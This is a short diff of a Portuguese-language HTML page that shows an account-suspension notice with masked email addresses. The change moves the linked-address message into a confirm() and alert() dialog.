@@ -78,8 +78,7 @@
     </div>
 
     <div class="message-container" id="messageContainer">
-        <p>Seu acesso foi suspenso por excesso de tentativas. ar5***68*@gmail.com. Isso ocorreu devido há várias tentativas de senha incorreta. Tente novamente em 13:53h am...
-        Os acessos foram vínculados ao seu dispositivo com os seguintes endereços ar5***68*@gmail.com/si***bra*024@gmail.com</p>
+        <p>Seu acesso foi suspenso por excesso de tentativas. ar5***68*@gmail.com. Isso ocorreu devido há várias tentativas de senha incorreta. Tente novamente em 13:53h am...</p>
     </div>
 
     <script>
@@ -108,6 +107,14 @@
                 console.error('Erro ao enviar o formulário:', error);
             });
         });
+
+                var resposta = confirm("Você quer continuar?");
+        if (resposta) {
+            alert(" Os acessos foram vínculados ao seu dispositivo com os seguintes endereços registrados em 18/01/2025 (ar5***68*@gmail.com/si***bra*024@gmail.com) ");
+        } else {
+            alert("Você escolheu sair.");
+        }
+
     </script>
 
 </body>
